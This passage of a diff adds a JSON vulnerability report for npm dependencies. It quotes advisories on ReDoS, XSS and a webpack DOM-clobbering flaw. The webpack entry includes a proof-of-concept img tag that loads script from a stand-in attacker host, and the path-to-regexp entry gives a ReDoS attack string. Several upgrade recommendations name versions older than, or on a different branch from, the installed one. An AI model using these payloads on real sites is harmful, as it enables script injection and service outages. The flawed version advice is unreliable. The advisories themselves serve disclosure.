+        "monthsSinceFix": 8,
+        "isOldFix": true
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/koajs/koa/security/advisories/GHSA-x2rg-q646-7m2v"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-32379"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/koajs/koa/commit/ff25eb4a7f2392df46481fe86355161067687312"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/koajs/koa"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-952p-6rrq-rcjv",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+          "type": "CVSS_V3"
+        }
+      ],
+      "aliases": [
+        "CVE-2024-4067"
+      ],
+      "summary": "Regular Expression Denial of Service (ReDoS) in micromatch",
+      "details": "The NPM package `micromatch` prior to version 4.0.8 is vulnerable to Regular Expression Denial of Service (ReDoS). The vulnerability occurs in `micromatch.braces()` in `index.js` because the pattern `.*` will greedily match anything. By passing a malicious payload, the pattern matching will keep backtracking to the input while it doesn't find the closing bracket. As the input size increases, the consumption time will also increase until it causes the application to hang or slow down. There was a merged fix but further testing shows the issue persisted prior to https://github.com/micromatch/micromatch/pull/266. This issue should be mitigated by using a safe pattern that won't start backtracking the regular expression due to greedy matching.\n",
+      "cwes": [
+        {
+          "id": "CWE-1333",
+          "name": "Inefficient Regular Expression Complexity (ReDoS)"
+        }
+      ],
+      "age": {
+        "age": "1 year(s) old",
+        "isRecent": false,
+        "publishedDate": "2024-05-14T18:30:54Z",
+        "modifiedDate": "2024-08-28T13:12:26Z",
+        "daysSincePublished": 582
+      },
+      "affected": {
+        "package": "micromatch",
+        "version": "4.0.4",
+        "ecosystem": "npm"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "4.0.4",
+        "fixedIn": "4.0.8",
+        "recommendation": "Upgrade to 4.0.8 or later",
+        "fixAvailableSince": "2024-08-28T13:12:26.000Z",
+        "daysSinceFix": 476,
+        "monthsSinceFix": 15,
+        "isOldFix": true
+      },
+      "references": [
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-4067"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/micromatch/micromatch/issues/243"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/micromatch/micromatch/pull/247"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/micromatch/micromatch/pull/266"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/micromatch/micromatch/commit/03aa8052171e878897eee5d7bb2ae0ae83ec2ade"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/micromatch/micromatch/commit/500d5d6f42f0e8dfa1cb5464c6cb420b1b6aaaa0"
+        },
+        {
+          "type": "WEB",
+          "url": "https://advisory.checkmarx.net/advisory/CVE-2024-4067"
+        },
+        {
+          "type": "WEB",
+          "url": "https://devhub.checkmarx.com/cve-details/CVE-2024-4067"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/micromatch/micromatch"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/micromatch/micromatch/blob/2c56a8604b68c1099e7bc0f807ce0865a339747a/index.js#L448"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/micromatch/micromatch/releases/tag/4.0.8"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-f8q6-p94x-37v3",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+          "type": "CVSS_V3"
+        }
+      ],
+      "aliases": [
+        "CVE-2022-3517"
+      ],
+      "summary": "minimatch ReDoS vulnerability",
+      "details": "A vulnerability was found in the minimatch package. This flaw allows a Regular Expression Denial of Service (ReDoS) when calling the braceExpand function with specific arguments, resulting in a Denial of Service.",
+      "cwes": [
+        {
+          "id": "CWE-1333",
+          "name": "Inefficient Regular Expression Complexity (ReDoS)"
+        },
+        {
+          "id": "CWE-400",
+          "name": "Uncontrolled Resource Consumption (DoS)"
+        }
+      ],
+      "age": {
+        "age": "3 year(s) old",
+        "isRecent": false,
+        "publishedDate": "2022-10-18T12:00:32Z",
+        "modifiedDate": "2024-02-14T18:15:16Z",
+        "daysSincePublished": 1156
+      },
+      "affected": {
+        "package": "minimatch",
+        "version": "3.0.4",
+        "ecosystem": "npm"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "3.0.4",
+        "fixedIn": "3.0.5",
+        "recommendation": "Upgrade to 3.0.5 or later",
+        "fixAvailableSince": "2024-02-14T18:15:16.000Z",
+        "daysSinceFix": 672,
+        "monthsSinceFix": 22,
+        "isOldFix": true
+      },
+      "references": [
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-3517"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/grafana/grafana-image-renderer/issues/329"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/nodejs/node/issues/42510"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/isaacs/minimatch/commit/a8763f4388e51956be62dc6025cec1126beeb5e6"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/isaacs/minimatch"
+        },
+        {
+          "type": "WEB",
+          "url": "https://lists.debian.org/debian-lts-announce/2023/01/msg00011.html"
+        },
+        {
+          "type": "WEB",
+          "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/MTEUUTNIEBHGKUKKLNUZSV7IEP6IP3Q3"
+        },
+        {
+          "type": "WEB",
+          "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/UM6XJ73Q3NAM5KSGCOKJ2ZIA6GUWUJLK"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-mwcw-c2x4-8c55",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N",
+          "type": "CVSS_V3"
+        }
+      ],
+      "aliases": [
+        "CVE-2024-55565"
+      ],
+      "summary": "Predictable results in nanoid generation when given non-integer values",
+      "details": "When nanoid is called with a fractional value, there were a number of undesirable effects:\n\n1. in browser and non-secure, the code infinite loops on while (size--)\n2. in node, the value of poolOffset becomes fractional, causing calls to nanoid to return zeroes until the pool is next filled\n3. if the first call in node is a fractional argument, the initial buffer allocation fails with an error\n\nVersion 3.3.8 and 5.0.9 are fixed.",
+      "cwes": [
+        {
+          "id": "CWE-835",
+          "name": "Unknown CWE"
+        }
+      ],
+      "age": {
+        "age": "1 year(s) old",
+        "isRecent": false,
+        "publishedDate": "2024-12-09T03:30:59Z",
+        "modifiedDate": "2025-11-04T16:54:54Z",
+        "daysSincePublished": 373
+      },
+      "affected": {
+        "package": "nanoid",
+        "version": "3.3.1",
+        "ecosystem": "npm"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "3.3.1",
+        "fixedIn": "5.0.9",
+        "recommendation": "Upgrade to 5.0.9 or later",
+        "fixAvailableSince": "2025-11-04T16:54:54.000Z",
+        "daysSinceFix": 43,
+        "monthsSinceFix": 1,
+        "isOldFix": false
+      },
+      "references": [
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-55565"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/ai/nanoid/pull/510"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/ai/nanoid"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/ai/nanoid/compare/3.3.7...3.3.8"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/ai/nanoid/releases/tag/5.0.9"
+        },
+        {
+          "type": "WEB",
+          "url": "https://lists.debian.org/debian-lts-announce/2024/12/msg00025.html"
+        },
+        {
+          "type": "WEB",
+          "url": "https://lists.debian.org/debian-lts-announce/2025/01/msg00006.html"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-76c9-3jph-rj3q",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:U/C:L/I:L/A:N",
+          "type": "CVSS_V3"
+        }
+      ],
+      "aliases": [
+        "CVE-2025-7339"
+      ],
+      "summary": "on-headers is vulnerable to http response header manipulation",
+      "details": "### Impact\n\nA bug in on-headers versions `< 1.1.0` may result in response headers being inadvertently modified when an array is passed to `response.writeHead()`\n\n### Patches\n\nUsers should upgrade to `1.1.0`\n\n### Workarounds\n\nUses are encouraged to upgrade to `1.1.0`, but this issue can be worked around by passing an object to `response.writeHead()` rather than an array.",
+      "cwes": [
+        {
+          "id": "CWE-241",
+          "name": "Unknown CWE"
+        }
+      ],
+      "age": {
+        "age": "Recent (< 6 months)",
+        "isRecent": true,
+        "publishedDate": "2025-07-17T21:17:19Z",
+        "modifiedDate": "2025-07-17T21:44:33.423834Z",
+        "daysSincePublished": 152
+      },
+      "affected": {
+        "package": "on-headers",
+        "version": "1.0.2",
+        "ecosystem": "npm"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "1.0.2",
+        "fixedIn": "1.1.0",
+        "recommendation": "Upgrade to 1.1.0 or later",
+        "fixAvailableSince": "2025-07-17T21:44:33.423Z",
+        "daysSinceFix": 152,
+        "monthsSinceFix": 5,
+        "isOldFix": false
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/jshttp/on-headers/security/advisories/GHSA-76c9-3jph-rj3q"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-7339"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/expressjs/morgan/issues/315"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/jshttp/on-headers/issues/15"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/jshttp/on-headers/commit/c6e384908c9c6127d18831d16ab0bd96e1231867"
+        },
+        {
+          "type": "WEB",
+          "url": "https://cna.openjsf.org/security-advisories.html"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/jshttp/on-headers"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-9wv6-86v2-598j",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+          "type": "CVSS_V3"
+        },
+        {
+          "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
+          "type": "CVSS_V4"
+        }
+      ],
+      "aliases": [
+        "CVE-2024-45296"
+      ],
+      "summary": "path-to-regexp outputs backtracking regular expressions",
+      "details": "### Impact\n\nA bad regular expression is generated any time you have two parameters within a single segment, separated by something that is not a period (`.`). For example, `/:a-:b`.\n\n### Patches\n\nFor users of 0.1, upgrade to `0.1.10`. All other users should upgrade to `8.0.0`.\n\nThese versions add backtrack protection when a custom regex pattern is not provided:\n\n- [0.1.10](https://github.com/pillarjs/path-to-regexp/releases/tag/v0.1.10)\n- [1.9.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v1.9.0)\n- [3.3.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v3.3.0)\n- [6.3.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v6.3.0)\n\nThey do not protect against vulnerable user supplied capture groups. Protecting against explicit user patterns is out of scope for old versions and not considered a vulnerability.\n\nVersion [7.1.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v7.1.0) can enable `strict: true` and get an error when the regular expression might be bad.\n\nVersion [8.0.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v8.0.0) removes the features that can cause a ReDoS.\n\n### Workarounds\n\nAll versions can be patched by providing a custom regular expression for parameters after the first in a single segment. As long as the custom regular expression does not match the text before the parameter, you will be safe. For example, change `/:a-:b` to `/:a-:b([^-/]+)`.\n\nIf paths cannot be rewritten and versions cannot be upgraded, another alternative is to limit the URL length. For example, halving the attack string improves performance by 4x faster.\n\n### Details\n\nUsing `/:a-:b` will produce the regular expression `/^\\/([^\\/]+?)-([^\\/]+?)\\/?$/`. This can be exploited by a path such as `/a${'-a'.repeat(8_000)}/a`. [OWASP](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS) has a good example of why this occurs, but the TL;DR is the `/a` at the end ensures this route would never match but due to naive backtracking it will still attempt every combination of the `:a-:b` on the repeated 8,000 `-a`.\n\nBecause JavaScript is single threaded and regex matching runs on the main thread, poor performance will block the event loop and can lead to a DoS. In local benchmarks, exploiting the unsafe regex will result in performance that is over 1000x worse than the safe regex. In a more realistic environment using Express v4 and 10 concurrent connections, this translated to average latency of ~600ms vs 1ms.\n\n### References\n\n* [OWASP](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS)\n* [Detailed blog post](https://blakeembrey.com/posts/2024-09-web-redos/)",
+      "cwes": [
+        {
+          "id": "CWE-1333",
+          "name": "Inefficient Regular Expression Complexity (ReDoS)"
+        }
+      ],
+      "age": {
+        "age": "1 year(s) old",
+        "isRecent": false,
+        "publishedDate": "2024-09-09T20:19:15Z",
+        "modifiedDate": "2025-01-24T21:31:27Z",
+        "daysSincePublished": 463
+      },
+      "affected": {
+        "package": "path-to-regexp",
+        "version": "6.2.0",
+        "ecosystem": "npm"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "6.2.0",
+        "fixedIn": "1.9.0",
+        "recommendation": "Upgrade to 1.9.0 or later",
+        "fixAvailableSince": "2025-01-24T21:31:27.000Z",
+        "daysSinceFix": 326,
+        "monthsSinceFix": 10,
+        "isOldFix": true
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/pillarjs/path-to-regexp/security/advisories/GHSA-9wv6-86v2-598j"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-45296"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pillarjs/path-to-regexp/commit/29b96b4a1de52824e1ca0f49a701183cc4ed476f"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pillarjs/path-to-regexp/commit/60f2121e9b66b7b622cc01080df0aabda9eedee6"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pillarjs/path-to-regexp/commit/925ac8e3c5780b02f58cbd4e52f95da8ad2ac485"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pillarjs/path-to-regexp/commit/d31670ae8f6e69cbfd56e835742195b7d10942ef"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pillarjs/path-to-regexp/commit/f1253b47b347dcb909e3e80b0eb2649109e59894"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/pillarjs/path-to-regexp"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pillarjs/path-to-regexp/releases/tag/v6.3.0"
+        },
+        {
+          "type": "WEB",
+          "url": "https://security.netapp.com/advisory/ntap-20250124-0001"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-c2qf-rxjj-qqgw",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+          "type": "CVSS_V3"
+        }
+      ],
+      "aliases": [
+        "CVE-2022-25883"
+      ],
+      "summary": "semver vulnerable to Regular Expression Denial of Service",
+      "details": "Versions of the package semver before 7.5.2 on the 7.x branch, before 6.3.1 on the 6.x branch, and all other versions before 5.7.2 are vulnerable to Regular Expression Denial of Service (ReDoS) via the function new Range, when untrusted user data is provided as a range.",
+      "cwes": [
+        {
+          "id": "CWE-1333",
+          "name": "Inefficient Regular Expression Complexity (ReDoS)"
+        }
+      ],
+      "age": {
+        "age": "2 year(s) old",
+        "isRecent": false,
+        "publishedDate": "2023-06-21T06:30:28Z",
+        "modifiedDate": "2024-12-06T20:34:31Z",
+        "daysSincePublished": 910
+      },
+      "affected": {
+        "package": "semver",
+        "version": "7.3.5",
+        "ecosystem": "npm"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "7.3.5",
+        "fixedIn": "7.5.2",
+        "recommendation": "Upgrade to 7.5.2 or later",
+        "fixAvailableSince": "2024-12-06T20:34:31.000Z",
+        "daysSinceFix": 375,
+        "monthsSinceFix": 12,
+        "isOldFix": true
+      },
+      "references": [
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-25883"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/npm/node-semver/pull/564"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/npm/node-semver/pull/585"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/npm/node-semver/pull/593"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/npm/node-semver/commit/2f8fd41487acf380194579ecb6f8b1bbfe116be0"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/npm/node-semver/commit/717534ee353682f3bcf33e60a8af4292626d4441"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/npm/node-semver/commit/928e56d21150da0413a3333a3148b20e741a920c"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/npm/node-semver"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/npm/node-semver/blob/main/classes/range.js#L97-L104"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/npm/node-semver/blob/main/classes/range.js%23L97-L104"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/npm/node-semver/blob/main/internal/re.js#L138"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/npm/node-semver/blob/main/internal/re.js#L160"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/npm/node-semver/blob/main/internal/re.js%23L138"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/npm/node-semver/blob/main/internal/re.js%23L160"
+        },
+        {
+          "type": "WEB",
+          "url": "https://security.netapp.com/advisory/ntap-20241025-0004"
+        },
+        {
+          "type": "WEB",
+          "url": "https://security.snyk.io/vuln/SNYK-JS-SEMVER-3247795"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-76p7-773f-r4q5",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N",
+          "type": "CVSS_V3"
+        }
+      ],
+      "aliases": [
+        "CVE-2024-11831"
+      ],
+      "summary": "Cross-site Scripting (XSS) in serialize-javascript",
+      "details": "A flaw was found in npm-serialize-javascript. The vulnerability occurs because the serialize-javascript module does not properly sanitize certain inputs, such as regex or other JavaScript object types, allowing an attacker to inject malicious code. This code could be executed when deserialized by a web browser, causing Cross-site scripting (XSS) attacks. This issue is critical in environments where serialized data is sent to web clients, potentially compromising the security of the website or web application using this package.",
+      "cwes": [
+        {
+          "id": "CWE-79",
+          "name": "Cross-Site Scripting (XSS)"
+        }
+      ],
+      "age": {
+        "age": "Last Year",
+        "isRecent": false,
+        "publishedDate": "2025-02-10T18:30:47Z",
+        "modifiedDate": "2025-11-28T21:46:28.307741Z",
+        "daysSincePublished": 310
+      },
+      "affected": {
+        "package": "serialize-javascript",
+        "version": "6.0.0",
+        "ecosystem": "npm"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "6.0.0",
+        "fixedIn": "6.0.2",
+        "recommendation": "Upgrade to 6.0.2 or later",
+        "fixAvailableSince": "2025-11-28T21:46:28.307Z",
+        "daysSinceFix": 18,
+        "monthsSinceFix": 0,
+        "isOldFix": false
+      },
+      "references": [
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-11831"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/yahoo/serialize-javascript/pull/173"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/yahoo/serialize-javascript/commit/f27d65d3de42affe2aac14607066c293891cec4e"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/yahoo/serialize-javascript/commit/7f3ac252d86b802454cb43782820aea2e0f6dc25"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/yahoo/serialize-javascript"
+        },
+        {
+          "type": "WEB",
+          "url": "https://bugzilla.redhat.com/show_bug.cgi?id=2312579"
+        },
+        {
+          "type": "WEB",
+          "url": "https://access.redhat.com/security/cve/CVE-2024-11831"
+        },
+        {
+          "type": "WEB",
+          "url": "https://access.redhat.com/errata/RHSA-2025:9294"
+        },
+        {
+          "type": "WEB",
+          "url": "https://access.redhat.com/errata/RHSA-2025:8551"
+        },
+        {
+          "type": "WEB",
+          "url": "https://access.redhat.com/errata/RHSA-2025:8544"
+        },
+        {
+          "type": "WEB",
+          "url": "https://access.redhat.com/errata/RHSA-2025:8512"
+        },
+        {
+          "type": "WEB",
+          "url": "https://access.redhat.com/errata/RHSA-2025:8479"
+        },
+        {
+          "type": "WEB",
+          "url": "https://access.redhat.com/errata/RHSA-2025:8233"
+        },
+        {
+          "type": "WEB",
+          "url": "https://access.redhat.com/errata/RHSA-2025:8078"
+        },
+        {
+          "type": "WEB",
+          "url": "https://access.redhat.com/errata/RHSA-2025:8059"
+        },
+        {
+          "type": "WEB",
+          "url": "https://access.redhat.com/errata/RHSA-2025:4511"
+        },
+        {
+          "type": "WEB",
+          "url": "https://access.redhat.com/errata/RHSA-2025:3870"
+        },
+        {
+          "type": "WEB",
+          "url": "https://access.redhat.com/errata/RHSA-2025:21203"
+        },
+        {
+          "type": "WEB",
+          "url": "https://access.redhat.com/errata/RHSA-2025:21068"
+        },
+        {
+          "type": "WEB",
+          "url": "https://access.redhat.com/errata/RHSA-2025:1468"
+        },
+        {
+          "type": "WEB",
+          "url": "https://access.redhat.com/errata/RHSA-2025:1334"
+        },
+        {
+          "type": "WEB",
+          "url": "https://access.redhat.com/errata/RHSA-2025:10853"
+        },
+        {
+          "type": "WEB",
+          "url": "https://access.redhat.com/errata/RHSA-2025:0381"
+        },
+        {
+          "type": "WEB",
+          "url": "https://access.redhat.com/errata/RHBA-2025:0304"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-4wf5-vphf-c2xc",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+          "type": "CVSS_V3"
+        }
+      ],
+      "aliases": [
+        "CVE-2022-25858"
+      ],
+      "summary": "Terser insecure use of regular expressions leads to ReDoS",
+      "details": "The package terser before 4.8.1, from 5.0.0 and before 5.14.2 are vulnerable to Regular Expression Denial of Service (ReDoS) due to insecure usage of regular expressions.",
+      "cwes": [
+        {
+          "id": "CWE-1333",
+          "name": "Inefficient Regular Expression Complexity (ReDoS)"
+        }
+      ],
+      "age": {
+        "age": "3 year(s) old",
+        "isRecent": false,
+        "publishedDate": "2022-07-16T00:00:20Z",
+        "modifiedDate": "2025-01-14T10:57:13.174999Z",
+        "daysSincePublished": 1250
+      },
+      "affected": {
+        "package": "terser",
+        "version": "5.9.0",
+        "ecosystem": "npm"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "5.9.0",
+        "fixedIn": "4.8.1",
+        "recommendation": "Upgrade to 4.8.1 or later",
+        "fixAvailableSince": "2025-01-14T10:57:13.174Z",
+        "daysSinceFix": 337,
+        "monthsSinceFix": 11,
+        "isOldFix": true
+      },
+      "references": [
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-25858"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/terser/terser/commit/a4da7349fdc92c05094f41d33d06d8cd4e90e76b"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/terser/terser/commit/d8cc5691be980d663c29cc4d5ce67e852d597012"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/terser/terser"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/terser/terser/blob/master/lib/compress/evaluate.js%23L135"
+        },
+        {
+          "type": "WEB",
+          "url": "https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-2949722"
+        },
+        {
+          "type": "WEB",
+          "url": "https://snyk.io/vuln/SNYK-JS-TERSER-2806366"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-4vvj-4cpr-p986",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:H",
+          "type": "CVSS_V3"
+        },
+        {
+          "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:L/VI:L/VA:H/SC:N/SI:N/SA:N",
+          "type": "CVSS_V4"
+        }
+      ],
+      "aliases": [
+        "CVE-2024-43788"
+      ],
+      "summary": "Webpack's AutoPublicPathRuntimeModule has a DOM Clobbering Gadget that leads to XSS",
+      "details": "### Summary\n\nWe discovered a DOM Clobbering vulnerability in Webpack’s `AutoPublicPathRuntimeModule`. The DOM Clobbering gadget in the module can lead to cross-site scripting (XSS) in web pages where scriptless attacker-controlled HTML elements (e.g., an `img` tag with an unsanitized `name` attribute) are present.\n\nWe found the real-world exploitation of this gadget in the Canvas LMS which allows XSS attack happens through an javascript code compiled by Webpack (the vulnerable part is from Webpack). We believe this is a severe issue. If Webpack’s code is not resilient to DOM Clobbering attacks, it could lead to significant security vulnerabilities in any web application using Webpack-compiled code.\n\n\n### Details\n\n#### Backgrounds\n\nDOM Clobbering is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets (pieces of js code) living in the existing javascript code to transform it into executable code. More for information about DOM Clobbering, here are some references:\n\n[1] https://scnps.co/papers/sp23_domclob.pdf\n[2] https://research.securitum.com/xss-in-amp4email-dom-clobbering/\n\n\n#### Gadgets found in Webpack\n\nWe identified a DOM Clobbering vulnerability in Webpack’s `AutoPublicPathRuntimeModule`. When the `output.publicPath` field in the configuration is not set or is set to `auto`, the following code is generated in the bundle to dynamically resolve and load additional JavaScript files:\n\n```\n/******/ \t/* webpack/runtime/publicPath */\n/******/ \t(() => {\n/******/ \t\tvar scriptUrl;\n/******/ \t\tif (__webpack_require__.g.importScripts) scriptUrl = __webpack_require__.g.location + \"\";\n/******/ \t\tvar document = __webpack_require__.g.document;\n/******/ \t\tif (!scriptUrl && document) {\n/******/ \t\t\tif (document.currentScript)\n/******/ \t\t\t\tscriptUrl = document.currentScript.src;\n/******/ \t\t\tif (!scriptUrl) {\n/******/ \t\t\t\tvar scripts = document.getElementsByTagName(\"script\");\n/******/ \t\t\t\tif(scripts.length) {\n/******/ \t\t\t\t\tvar i = scripts.length - 1;\n/******/ \t\t\t\t\twhile (i > -1 && (!scriptUrl || !/^http(s?):/.test(scriptUrl))) scriptUrl = scripts[i--].src;\n/******/ \t\t\t\t}\n/******/ \t\t\t}\n/******/ \t\t}\n/******/ \t\t// When supporting browsers where an automatic publicPath is not supported you must specify an output.publicPath manually via configuration\n/******/ \t\t// or pass an empty string (\"\") and set the __webpack_public_path__ variable from your code to use your own logic.\n/******/ \t\tif (!scriptUrl) throw new Error(\"Automatic publicPath is not supported in this browser\");\n/******/ \t\tscriptUrl = scriptUrl.replace(/#.*$/, \"\").replace(/\\?.*$/, \"\").replace(/\\/[^\\/]+$/, \"/\");\n/******/ \t\t__webpack_require__.p = scriptUrl;\n/******/ \t})();\n```\n\nHowever, this code is vulnerable to a DOM Clobbering attack. The lookup on the line with `document.currentScript` can be shadowed by an attacker, causing it to return an attacker-controlled HTML element instead of the current script element as intended. In such a scenario, the `src` attribute of the attacker-controlled element will be used as the `scriptUrl` and assigned to `__webpack_require__.p`. If additional scripts are loaded from the server, `__webpack_require__.p` will be used as the base URL, pointing to the attacker's domain. This could lead to arbitrary script loading from the attacker's server, resulting in severe security risks.\n\n### PoC\n\nPlease note that we have identified a real-world exploitation of this vulnerability in the Canvas LMS. Once the issue has been patched, I am willing to share more details on the exploitation. For now, I’m providing a demo to illustrate the concept.\n\nConsider a website developer with the following two scripts, `entry.js` and `import1.js`, that are compiled using Webpack:\n\n```\n// entry.js\nimport('./import1.js')\n  .then(module => {\n    module.hello();\n  })\n  .catch(err => {\n    console.error('Failed to load module', err);\n  });\n```\n\n```\n// import1.js\nexport function hello () {\n  console.log('Hello');\n}\n```\n\nThe webpack.config.js is set up as follows:\n```\nconst path = require('path');\n\nmodule.exports = {\n  entry: './entry.js', // Ensure the correct path to your entry file\n  output: {\n    filename: 'webpack-gadgets.bundle.js', // Output bundle file\n    path: path.resolve(__dirname, 'dist'), // Output directory\n    publicPath: \"auto\", // Or leave this field not set\n  },\n  target: 'web',\n  mode: 'development',\n};\n```\n\nWhen the developer builds these scripts into a bundle and adds it to a webpage, the page could load the `import1.js` file from the attacker's domain, `attacker.controlled.server`. The attacker only needs to insert an `img` tag with the `name` attribute set to `currentScript`. This can be done through a website's feature that allows users to embed certain script-less HTML (e.g., markdown renderers, web email clients, forums) or via an HTML injection vulnerability in third-party JavaScript loaded on the page.\n\n```\n<!DOCTYPE html>\n<html>\n<head>\n  <title>Webpack Example</title>\n  <!-- Attacker-controlled Script-less HTML Element starts--!>\n  <img name=\"currentScript\" src=\"https://attacker.controlled.server/\"></img>\n  <!-- Attacker-controlled Script-less HTML Element ends--!>\n</head>\n<script 